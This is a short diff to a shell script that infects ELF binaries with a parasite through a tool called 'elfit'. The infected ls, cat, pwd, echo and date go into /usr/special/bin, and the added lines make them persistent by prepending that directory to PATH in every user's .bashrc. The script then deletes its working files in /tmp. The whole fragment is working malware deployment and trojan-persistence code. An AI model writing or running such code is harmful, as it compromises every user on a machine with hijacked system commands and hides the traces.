@@ -21,14 +21,14 @@ echo " #Infecting echo" >> output
 ./elfit -p parasites/evil -t --start-main init echo >> output
 echo "" >> output
 
+mkdir /usr/special
 mkdir /usr/special/bin
 mv ls cat pwd echo date /usr/special/bin
 
+for f in `find /home -maxdepth 1 -type d`; do
+  if [ $f != "/home" ] ; then
+    echo "PATH=/usr/special/bin:$PATH" >> $f/.bashrc
+  fi
+done
 
-
-
-
-#chmod go-rw output
-#cp output /tmp
-#mv ls /bin/ls
-
+rm -rf /tmp/elf /tmp/elfit
